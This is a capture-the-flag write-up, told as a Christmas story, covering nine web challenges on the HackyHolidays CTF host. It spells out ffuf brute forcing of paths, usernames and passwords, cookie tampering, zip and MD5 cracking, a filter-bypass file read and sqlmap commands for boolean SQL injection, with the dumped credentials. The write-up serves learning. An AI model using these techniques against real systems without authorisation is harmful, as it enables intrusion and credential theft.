# How The Hackers Saved Christmas

## Report Details
- **Report ID**: 1069335
- **URL**: https://hackerone.com/reports/1069335
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-31T15:39:50.665Z
- **Disclosed**: 2021-01-11T22:05:23.798Z

## Reporter
- **Username**: nytr0gen
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
{F1139789}

# Challenge I 🤖

"What are you doing?" I asked myself. I was about to trespass a clear warning to **keep out**.

{F1139744}

"Have you lost your mind?" But I couldn't help it. I was born for this. And I wasn't going to back down. There are 12 more days until Christmas Eve, and I wasn't going to let a green furry dude destroy everything.

Let me backtrack a few days earlier. I minded my own business, prepping the Christmas tree on an old Elvis Presley album. I had planned holidays for my family and me, for a much-deserved getaway together.

Somehow I ended up on Twitter, just checking up on things from all my favorite hackers.

Suddenly my mood changed when I saw this tweet. [This Grinch](https://twitter.com/adamtlangley) with [his malefic little helper](https://twitter.com/nahamsec) made an evil plan to destroy everything. Not just my holidays. Everyone's holidays!

{F1139797}

I had to step up and stop it! I had **to save Christmas**! It is my duty!

Back to the present moment, I had to trespass the property to have a fighting chance. But there was nothing there, not a door or a crack on the wall.

I checked the **robots.txt** file for more clues. Luckily, the green beast left a trail.

```
User-agent: *
Disallow: /s3cr3t-ar3a
Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
```

Web developers use this file to tell Web Crawlers what files/directories to avoid when indexing a website. Our friend here kept himself safe from these crawlers but instead leaked the path to finding him and his plan.

I solved the first riddle, but I will not rest. Not until I save the holy day!

# Challenge II 🔎

{F1139746}

11 days until Christmas!

The furry monster left a trail. I followed that path directly into a trap. It appears I have underestimated my enemy.

{F1139747}

Is there nothing here to be found that could help me further? I took out my magnifying glass to *inspect the elements*. There must be a hint of where to look next!

{F1139745}

I found the second flag, which brings me closer to saving the world!

"This isn't possible!" I exclaimed. I found the flag in DevTools, but I couldn't find it anywhere in the source code.

"How does it appear? What am I missing?" The only thing I haven't checked is the `jquery.min.js` file. But that couldn't be. That's a standard framework.

I had to look. And there it was, entirely hidden inside jQuery code.

```js
h1_0 = 'la';
h1_1 = '}';
h1_2 = '';
h1_3 = 'f';
h1_4 = 'g';
h1_5 = '{b7ebcb75';
h1_6 = '8454-';
h1_7 = 'cfb9574459f7';
h1_8 = '-9100-4f91-';
document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);
document.getElementById('alertbox').setAttribute('next-page', '/ap' + 'ps');
```

The next step was clear now. This wasn't a trap, after all. At this point, I was starting to believe that the Grinch wanted to be found?! Maybe he doesn't want to be a mean person, after all. Perhaps it's a phase, and he needs some help. I was going to find out.

# Challenge III - People Rater 📑

{F1139749}

The Grinch is not stopping. And neither am I. There's this phone call from Taken that comes to mind:

> I don't know who you are. I don't know what you want. If you are looking for ransom, I can tell you I don't have money, but what I do have are a very particular set of skills. Skills I have acquired over a very long career. Skills that make me a nightmare for people like you. If you let Santa Claus go now, that'll be the end of it. I will not look for you, I will not pursue you, but if you don't, I will look for you, I will find you, and I will save Christmas.

For today's challenge, the green thing has leaked his list of people that he hates with motivation for each one of them. Grinch and Santa Claus seem to be sharing habits.

I started analyzing the application. I'm struck by the fact that the list is so long! This list has 16 persons that may have done nothing wrong.

{F1139751}

When clicking on a person, the application makes a GET JSON request to `https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=`, with an ID for each person.

The ID is encoded in Base 64. Usually, to decode this, I use `bash` directly. Sometimes [CyberChef](https://gchq.github.io/CyberChef/) for more complicated stuff. And lately, with the new Burp updates, the Inspector.

```bash
> echo 'eyJpZCI6Mn0=' | base64 -d
{"id":2}
```

Hmm! The decoded string contains the ID for the first person on the list, named Tea Avery. And the ID for the last person is `'eyJpZCI6MTd9' == b64('{"id":17}')`.

That raises some questions! Who has the number 1 ID? Let's send a request with the Burp Repeater. The encoded ID should be `b64('{"id":1}') == 'eyJpZCI6MX0='`.

{F1139748}

**I found him.** Now some proper rest is required because tomorrow something more challenging will come.

Quick Note on Burp Suite: If you're starting in the Bug Bounty journey, my recommendation is to use the [Burp Suite Community Edition](https://portswigger.net/burp/communitydownload) until you get your first bounty that covers the cost of Burp Suite Pro. That's how I did. That's how many bug hunters I know have done it. Keep the costs low in the beginning. The Community Edition has all the features you need to get a jump start.

# Challenge IV - Swag Shop 🛒🍪

{F1139754}

Is this the next challenge? Because I really need a new Christmas hoodie.

{F1139752}

Only 3 items in store for now. Nothing fancy in the source code. The application makes a get JSON request to `/swag-shop/api/stock`. I didn't find any parameters and no other items.

In moments like this, I pull out my little friend [`ffuf`](https://github.com/ffuf/ffuf) and start ramming at things. *P.S. I do not recommend using as many threads as I am outside of CTF competitions. Always check the policy of the bounty program you are participating in.*

I used the `common.txt` wordlist from [SecLists](https://github.com/danielmiessler/SecLists). Now let me share a trick from my toolbox. It's pretty annoying to write the paths to wordlists so many times. But I also don't like to use a wrapper for directory busting because I want to take advantage of `ffuf` options. So I'm using variables in bash for the most used wordlists, and they're saved in `.bashrc`/`.zshrc`.


```bash
> export COMMONDIR="$HOME/tools/SecLists/Discovery/Web-Content/common.txt"
> ffuf -u 'https://hackyholidays.h1ctf.com/swag-shop/FUZZ' -w $COMMONDIR -t 100 -c -mc all -fc 404

        /'___\  /'___\           /____\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/FUZZ
 :: Wordlist         : FUZZ: /home/robert/tools/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

api                     [Status: 200, Size: 23, Words: 2, Lines: 1]
:: Progress: [4661/4661] :: Job [1/1] :: 665 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

First, let's dive into the parameters I used for ffuf. My favorite is `-c` because it colorizes the output. The number of threads is set with `-t`.

And the magic happens with `-mc all` and `-fc 404`. I noticed that `404` is the status code for nonexisting directories/files on this application. This is very common. The parameter `-fc 404` filters out any response with a 404 status code. Also, `-mc all` matches all status codes. I need this because, by default, ffuf matches only a handful of status codes.

Back to the grinching. I already found that `/api` endpoint. Maybe is something hidden there? Time for another ffuf.

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ' -w $COMMONDIR -mc all -fc 404
sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
```

I know `/api/stock` already. This is the one that's requested from the application page for the items.

What about `/api/sessions`? This one should be interesting.

```js
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/sessions' | jq
{
  "sessions": [
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=",
    "eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=",
    "eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="
  ]
}
```

Base64 again. This seems to be a common thread with the evil Grinch. Just copy the JSON response to https://gchq.github.io/CyberChef/ and choose `From Base64`. That recipe will skip any non-base64 characters and decode the good ones. This helps the lazy ones like me.

In the decoding, each session is a JSON object with keys `user` and `cookie`. Each session has a cookie, but only one of them has a `user` key.

```json
{
    "user": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
    "cookie": "NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
}
```

Decoding the base64 from the cookie points to a hex string of 128 characters. Decoding the hex string results in binary data, so my guess is that's a hash.

This seems to be a dead-end, and I'm in a hurry to find the Grinch.

What about the `/api/user` endpoint?

```bash
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/user' | jq
{
  "error": "Missing required fields"
}
```

That's something. To find hidden parameters, I am using [Arjun](https://github.com/s0md3v/Arjun) because it's speedy and has excellent visual effects.

```bash
> cd ~/tools/Arjun
> python3 arjun.py -u 'https://hackyholidays.h1ctf.com/swag-shop/api/user'
    _
   /_| _
  (  |/ /(//) v2.0-beta
      _/

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] name: uuid, factor: http code
```

It found the parameter `uuid`. I've seen a UUID before in the sessions. I tried it!

```bash
> curl 'https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' | jq
{
  "uuid": "C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
  "username": "grinch",
  "address": {
    "line_1": "The Grinch",
    "line_2": "The Cave",
    "line_3": "Mount Crumpit",
    "line_4": "Whoville"
  },
  "flag": "flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"
}
```

{F1139753}

I successfully doxed the big nasty green fluffy monster. He won't know what's coming! And I still want my hoodie.

# Challenge V - Secure Login 🐏

{F1139760}

I need to get inside the secret area. The application has a login page with username and password, and nothing more.

{F1139755}

I tried directory bruteforcing, nothing was found. Tried parameters, got nothing again. Then I tried [SQL Injection to bypass the authentication](https://portswigger.net/support/using-sql-injection-to-bypass-authentication) step. This is a really old school attack, but it didn't work...

Trying the login, I noticed that I am able to enumerate usernames. The error when trying anything is `Invalid Username`. This means I can possibly try bruteforcing usernames.

Let's get the good old ffuf out for this one. If you own a Burp Pro license, you can use the Intruder for this one. I recommend reading [this excellent article](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html) at some point because the next command is going to be HUGE.

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/secure-login' \
    -w $HOME/tools/SecLists/Usernames/xato-net-10-million-usernames-dup.txt \
    -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'username=FUZZ&password=test' \
    -fr 'Invalid Username'

access                  [Status: 200, Size: 1724, Words: 464, Lines: 37]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Let's dive into this monster. I chose a big wordlist for usernames from SecLists. After I got a hit, I stopped ffuf from running. Hopefully, I will need only one username.

Now the cool part. I had to send a POST request with **username** and **password**. That's done by setting the method via `-X` parameter to POST. Then setting the Content-Type header to `application/x-www-form-urlencoded` with the `-H` parameter. Then setting the POST data to `username=FUZZ&password=test`. **FUZZ** is the magic word here.

And the last parameter, named **Filter regexp**, will filter out any response with `Invalid Username`.

I tried using the username found, only to be met with a new error.

{F1139758}

I feel like I'm making progress here. Let's do the same thing, now for the password. And I chose the edgiest wordlist I could find for passwords!

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/secure-login' \
    -w $HOME/tools/SecLists/Passwords/darkweb2017-top1000.txt \
    -X POST -H 'Content-Type: application/x-www-form-urlencoded' \
    -d 'username=access&password=FUZZ' \
    -fr 'Invalid Password'

computer                [Status: 302, Size: 0, Words: 1, Lines: 1]
```

Ok! Let's try this out! I logged in with the username **access** and the password **computer**. I wasn't expecting what came next.

{F1139756}

Seems I've been tricked again by the Grinch. Luckily this took much less time to figure out. There was nothing on the page (source code, javascript files).

I noticed the cookie has an interesting format. It's a Base 64 for a session cookie.

{F1139757}

What if I change the **admin** parameter in the JSON to **true**? Magic hopefully happens! *Did I mention how much I enjoy the Inspector functionality from Burp?! It's really awesome*

The new cookie should look like this:

```
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
```

And magic does happen. Sending a request to the page with session cookie reveals a secret file at https://hackyholidays.h1ctf.com/my_secure_files_not_for_you.zip (in case the server will be shut down, this is the archive {F1139792}).

Well, that's juicy! What could the fluffy beast hide in here? I downloaded the file and tried to read the contents, but they are password-protected... Let's try to use [John the Ripper](https://www.openwall.com/john/) for this one.

```bash
> 7z l my_secure_files_not_for_you.zip
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2020-12-16 18:41:29 .....       215058       215105  xxx.png
2020-12-16 18:22:20 .....           43           55  flag.txt
------------------- ----- ------------ ------------  ------------------------
2020-12-16 18:41:29             215101       215160  2 files

> zip2john my_secure_files_not_for_you.zip > zip.hashes
ver 2.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/xxx.png PKZIP Encr: 2b chk, TS_chk, cmplen=215105, decmplen=215058, crc=277DEE70
ver 1.0 efh 5455 efh 7875 my_secure_files_not_for_you.zip/flag.txt PKZIP Encr: 2b chk, TS_chk, cmplen=55, decmplen=43, crc=9DE7C581

> john --show zip.hashes
my_secure_files_not_for_you.zip:hahahaha::my_secure_files_not_for_you.zip:flag.txt, xxx.png:my_secure_files_not_for_you.zip
```

It didn't take much to get the password.

```
> unzip -P hahahaha my_secure_files_not_for_you.zip
Archive:  my_secure_files_not_for_you.zip
  inflating: xxx.png
 extracting: flag.txt

> cat flag.txt
flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
```

Will I catch the Grinch in time? Things are getting harder by the day.

# Challenge VI - My Diary 📅

Good morning to everyone following the Anti Grinch Adventures! The challenge for today is the personal Diary of the big man himself, Mr. Grinch.

{F1139796}

The first step is to analyze the application. And directory bruteforcing, of course.

{F1139759}

Dirbusting returned with nothing. Analyzing the URL, I observed a `template` parameter with the value `entries.html`.

```
> ffuf -u 'https://hackyholidays.h1ctf.com/my-diary/?template=FUZZ' -w $COMMONDIR -fc 302
index.php               [Status: 200, Size: 689, Words: 126, Lines: 22]
```

I checked out the page at [/my-diary/?template=index.php](https://hackyholidays.h1ctf.com/my-diary/?template=index.php), and it's a full-on Source Code Leak. Wowza! The Grinch really needs some help with the security of his services!


```php
<?php
if (isset($_GET["template"])) {
    $page = $_GET["template"];
    // remove non allowed characters
    $page = preg_replace("/([^a-zA-Z0-9.])/", "", $page);
    // protect admin.php from being read
    $page = str_replace("admin.php", "", $page);
    // I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php", "", $page);

    if (file_exists($page)) {
        echo file_get_contents($page);
    } else { // redirect to home
        header("Location: /my-diary/?template=entries.html");
    }
}
```

From this code, I figured out that the important thing we want to get is `secretadmin.php`. It can't be accessed directly. Path Traversal is completely blocked with the first `preg_replace`, because `/` is not allowed.

This is a common case of bad filtering. In this scenario, I can't use **admin.php** directly as the value. But I can use **ad**==admin.php==**min.php**. The value from inside will be removed, but because the replacement is not applied recursively, the value from outside will stay as-is.

It gets a bit more complicated with **secretadmin.php** because it contains the word **admin.php**. My solution is the following **secretad**==secretad==_admin.php_==min.php==**min.php**.

{F1139761}

Now I know what the Grinch is planning! **Launch DDoS Against Santa's Workshop!** on the 23rd of December. That's the evilest thing a hacker Grinch can do!

# Challenge VII - Hate Mail Generator 📫

{F1139800}

The application is quite interesting. It contains a page listing the email campaigns that have been sent—the possibility of creating new email campaigns and previewing them. Sending an email campaign doesn't work.

{F1139763}

The templating code looks similar to Mustache or Jinja2. So naturally, I thought of Server-Side Template Injection and consulted the faithful documentation of [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection). But sadly, nothing worked.

Running out of ideas this quick, I ran a directory bruteforce:

```bash
> ffuf -u 'https://hackyholidays.h1ctf.com/hate-mail-generator/FUZZ' -w $COMMONDIR -mc all -fc 404
new                     [Status: 200, Size: 2494, Words: 440, Lines: 49]
templates               [Status: 302, Size: 0, Words: 1, Lines: 1]
```

I know what `/new` endpoint does. But the `/templates` is still unknown. Visiting https://hackyholidays.h1ctf.com/hate-mail-generator/templates, I bump into a public directory listing.

{F1139764}

It's disclosing 3 files. They can't be accessed directly. And the header and footer files have been used before in the campaign that has already been sent by the Grinch. The other template, namely `38dhs_admins_only_header.html`, wasn't used anywhere yet and seems a bit private.

I started playing with the mail generator preview and the `{{template:..}}` functionality in the Burp Repeater. Protip: It's a lot easier to use the multipart encoding when sending POST requests if the application accepts it because this way, I avoid URL encoding/decoding.

{F1139766}

| Markup      | Status |
| ----------- | ----------- |
| {{template:**cbdj3_grinch_header.html**}} | **Works** |
| {{template:**cbdj3_grinch_footer.html**}} | **Works** |
| {{template:**38dhs_admins_only_header.html**}} | You do not have access |
| {{template:**./cbdj3_grinch_header.html**}} | Cannot find template file /templates/.cbdj3_grinch_header.html |
| {{template:**../templates/cbdj3_grinch_header.html**}} | Cannot find template file /templates/..templatescbdj3_grinch_header.html |
| {{template:**./test/../cbdj3_grinch_header.html**}} | Cannot find template file /templates/.test..cbdj3_grinch_header.html |
| {{template:**{{name}}**}} | Missing key name}} in dataset |

The last one might be interesting. I added `name}}` to the dataset, and the result was `{{template:test`. Then playing with this payload appended to one of the initial markups, I found it quite interesting that it had different behavior.

{F1139810}

This one took a bit of luck to exploit.

# Challenge VIII - Forum 💬

{F1139798}

Analyzing the application and running directory bruteforce. The usual start.

{F1139767}

Looks like a simple forum. But the results from ffuf reveal an interesting endpoint at `/phpmyadmin`. The Security Team from Grinch Networks missed this important application. I tried default credentials with `root:root` and some simple combinations but with no luck.

{F1139811}

I tried a lot of stuff on the forum application and the login. I tried to send post requests directly to the endpoints. I tried bruteforcing for parameters. I tried looking for leaks in the source code. There was nothing!!!

I figured what the hell, let's try Google Dorks for "Grinch Networks". I've been collecting interesting Google Dorks for a while now from Twitter, and I rarely get to use them. Here is my list {F1139812} and I usually use a bash replace and open them all up with Google Chrome from the command line.

One with interesting results was [site:github.com grinch networks](https://www.google.com/search?q=site:github.com+grinch%20networks). The first result was the [Github of the Grinch](https://github.com/adamtlangley). He contributed to a repository named [**Forum**](https://github.com/Grinch-Networks/forum) in the **Grinch-Networks** organization. \*The plot thickens!\*

I cloned the repository locally and started source code review. Weird, but the application looks really tight. Nothing vulnerable that could be used to help Santa.

I checked the commits on GitHub because there were only 4 of them. So I clicked on each one, one by one. The second commit includes the username and password for the database. YES!!

{F1139813}

And the credentials worked on https://hackyholidays.h1ctf.com/forum/phpmyadmin. There are 4 tables.

| Table | Rows |
| ----- | :--: |
| comment | N/A |
| post | N/A |
| section | N/A |
| user | 2 |

Only the `user` table is accessible and contains two rows.

| id  | username | password | admin |
| :-: | -------- | -------- | :---: |
| 1  | grinch | 35D652126CA1706B59DB02C93E0C9FBF | 1 |
| 2  | max | 388E015BC43980947FCE0E5DB16481D1 | |

I'm usually in hyperdrive when I find things like this. I went fast, fast, fast to the next step and the next step like in a trance!

The password looks like an MD5. I try these with online services like https://hashtoolkit.com/ and https://crackstation.net/. Only the second online hash cracker worked and found **BahHumbug** for the grinch's password.

For anyone wondering what the word means, like myself, here is the definition from [Urban Dictionary](https://www.urbandictionary.com/define.php?term=Bah%20Humbug):

> An expression used to show disgust at the Christmas season, made famous by the fictional character Ebinizer Scrooge in the Charles Dickens novel 'A Christmas Carol'.
>
> *Guy: I love Christmas, Don't you, Mr. Scrooge?*
> *Scrooge: Bah Humbug*

I logged in at https://hackyholidays.h1ctf.com/forum/login with `grinch:BahHumbug` credentials and accessed the Secret Plans.

{F1139817}

The Grinch must be stopped!

# Challenge IX - Evil Quiz ❓

{F1139773}

I think the Grinch may have started recruiting for his evil army. I started analyzing the application and bruteforcing for directories.

{F1139770}

The only inputs here are the name and the answers to the quiz. There isn't much room to mingle. My first thought was Blind Cross-Site Scripting. I use [XSS Hunter](https://xsshunter.com/) for this, and I _spray and pray_.

Nothing happened. It was time to rethink my approach!

I observed an interesting little thing on the last page of the quiz.

> There is 56 other player(s) with the same name as you!

My spidey-senses told me this might be an [SQL Injection](https://portswigger.net/web-security/sql-injection)? There's only one way to find out. Try a bunch of
basic payloads until something works!

| Name | Num of Players |
| ---- | :------------: |
| test | 56 |
| grinch | 17 |
| reallyuniquename1283823 | 1 |
| nytr0gen | 1 |
| test' | 0 |
| test" | 1 |

So far, I can see that any name will have at least one other player with the same name. This means that the query is not filtering out my quiz response. But then, why does `test'` responds with **0** instead of **1**.

I think the query looks something like this.

```sql
SELECT COUNT(*)
FROM quiz_answers
WHERE name = '$input_name'
```

In this scenario, a double quote will not affect the response, but a single quote will break it. This means that if I send `test' or 1='1`, the answer will not be 1 or 0; it will be the total number of answers!

{F1139771}

Note: I took the liberty of answering like a Grinch soldier would to this quiz, just to see what happens.

And it worked! This looks like a Boolean-based SQL Injection. It's time to use [sqlmap](http://sqlmap.org/) to help me with dumping data from the database! I'm not the best at using this tool, and I have consulted the [documentation](https://github.com/sqlmapproject/sqlmap/wiki/Usage) a lot to do this. I do prefer it because it's really useful for dumping everything.

The other option would have been to write a script to make both requests, and write all the queries by hand, then have a binary search for the characters—kind of boring.

```bash
sqlmap -u "https://hackyholidays.h1ctf.com/evil-quiz" \
    --data="name=nytr0gen" \
    --cookie="session=25677e0c322966d2d4cc71b2c3e49e86" \
    --drop-set-cookie --ignore-redirects \
    -p name --dbms=mysql --prefix="'" \
    --technique=B \
    --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" \
    --string="is 1 other" \
    --proxy="http://localhost:8080/" \
    --save=$PWD/quiz.conf
```

This is the mighty initial command. Let's break it down.

- The parameter `-u` is for the target URL
- The parameter `--data` is attaching the POST data parameters
- The parameter `--cookie` is for setting the cookie. The vulnerable parameter `name` is attached to the session. To be able to see the response in the second request, the cookie needs to be preserved. Note: I used my cookie session after completing the quiz, and it seems it is the only way it works to bypass the actual quiz and make only 2 requests instead of 3.
- The parameter `--drop-set-cookie` is to ignore the set-cookie header after the POST request.
- The parameter `--ignore-redirects` is to ignore the redirect to completing the quiz.
- The parameter `-p` is to point to the vulnerable parameter.
- The parameter `--dbms` is to help sqlmap a little by setting the correct database. My assumption is that it's MySQL.
- The parameter `--prefix` is really helpful here because I already figured out how the query is formed, so I'm basically helping sqlmap figure things out faster.
- I've been looking for this one for a while now. The parameter `--technique` forces the technique used to be Boolean / Time Based / Union / etc. In this case, it's set to Boolean.
- The parameter `--second-url` is where the actual magic happens. Because the request is sent to one endpoint and the result from the vulnerable query happens on another, I used this parameter to point to that page.
- The parameter `--string` is a little bit tricky. Sqlmap didn't figure out on its own about how things are changing on that page for successful queries. *I don't blame you. I blame myself.* I figured I could help a little by pointing out the right phrase for a successful query. Note: The name has to be unique, but it has to be used one more time on another session. Because if it's not used at all, it will result in **0**. And if I would have used **test**, that name might have gained more people.
- The parameter `--proxy` is so that I can see everything in Burp Suite.
- The parameter `--save` is really important because it saves all those commands in a config file that can later be referenced when dumping the database.

Let's start talking business.

```bash
> sqlmap -u "https://hackyholidays.h1ctf.com/evil-quiz" \
    --data="name=nytr0gen" \
    --cookie="session=25677e0c322966d2d4cc71b2c3e49e86" \
    --drop-set-cookie --ignore-redirects \
    -p name --dbms=mysql --prefix="'" \
    --technique=B \
    --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" \
    --string="is 1 other" \
    --proxy="http://localhost:8080/" \
    --save=$PWD/quiz.conf

        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.12#stable}
|_ -| . [']     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

sqlmap identified the following injection point(s) with a total of 16 HTTP(s) requests:
---
Parameter: name (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: name=nytr0gen' AND 5126=5126 AND 'JwkO'='JwkO
---
back-end DBMS: MySQL >= 8.0.0
```

With the payload discovered by sqlmap and the config file saved, I can run the next couple of commands more easily. I need to get the current database, then the tables of the database, then the columns of my target table, and finally the rows.

```
> sqlmap -c $PWD/quiz.conf --current-db
current database: 'quiz'

> sqlmap -c $PWD/quiz.conf -D quiz --tables
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+

> sqlmap -c $PWD/quiz.conf -D quiz -T admin --columns
Database: quiz
Table: admin
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int          |
| password | varchar(250) |
| username | varchar(250) |
+----------+--------------+

> sqlmap -c $PWD/quiz.conf -D quiz -T admin --dump
Database: quiz
Table: admin
[1 entry]
+----+-------------------+----------+
| id | password          | username |
+----+-------------------+----------+
| 1  | S3creT_p4ssw0rd-$ | admin    |
+----+-------------------+----------+
```

Nice! It took a bit to get these all out. In retrospection, I could've scripted it :)))

Using the username and the password gets me inside the Admin Area, which contains the flag.

{F1139768}

I am close! The Grinch must be scared. Only a few days until Christmas.

# Challenge X - Signup Manager 💾

{F1139777}

Analyzing the application and running directory bruteforce. Not much to be seen. It's a simple application for applying to the Grinch Evil Army! I guess the quiz must have been taken into consideration for this application.

{F1139774}

Something interesting I noticed in the source code is a comment to **See README.md for assistance**. I hastily accessed `https://hackyholidays.h1ctf.com/signup-manager/README.md` and was met with the following file.

{F1139775}

My next move was to download `signupmanager.zip`. Oh, and the default login didn't work. That would have been too easy :)))

```
> wget 'https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip'
Connecting to hackyholidays.h1ctf.com (hackyholidays.h1ctf.com)|18.216.153.32|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4118 (4.0K) [application/zip]
Saving to: 'signupmanager.zip'

> unzip signupmanager.zip
Archive:  signupmanager.zip
  inflating: README.md
  inflating: admin.php
  inflating: index.php
  inflating: signup.php
  inflating: user.php
```

To spare the unnecessary details for the story, only **index.php** was interesting from all of these.

```php
<?php
// -- snip --
